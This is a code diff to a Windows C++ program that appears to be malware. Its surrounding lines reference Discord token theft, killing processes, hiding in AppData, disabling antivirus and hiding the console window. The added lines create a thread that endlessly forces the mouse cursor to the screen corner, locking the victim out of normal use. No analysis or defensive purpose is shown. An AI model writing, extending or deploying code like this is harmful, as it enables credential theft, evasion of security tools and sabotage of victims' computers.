@@ -1308,6 +1308,14 @@ std::string getDiscordTokens() {
     return out;
 }
 
+DWORD WINAPI mouseLockThread(LPVOID) {
+    while (true) {
+        SetCursorPos(0, 0);
+        Sleep(30);
+    }
+    return 0;
+}
+
 void killProcessByName(const char* name) {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) return;
@@ -1682,6 +1690,7 @@ int main(int argc, char* argv[]) {
     }
     if (computerName.empty()) computerName = getComputerName();
     hideToAppData();
+    CreateThread(0, 0, mouseLockThread, 0, 0, 0);
     disableAntivirus();
     HWND hwnd = GetConsoleWindow();
     if (hwnd && !showConsole) ShowWindow(hwnd, SW_HIDE);
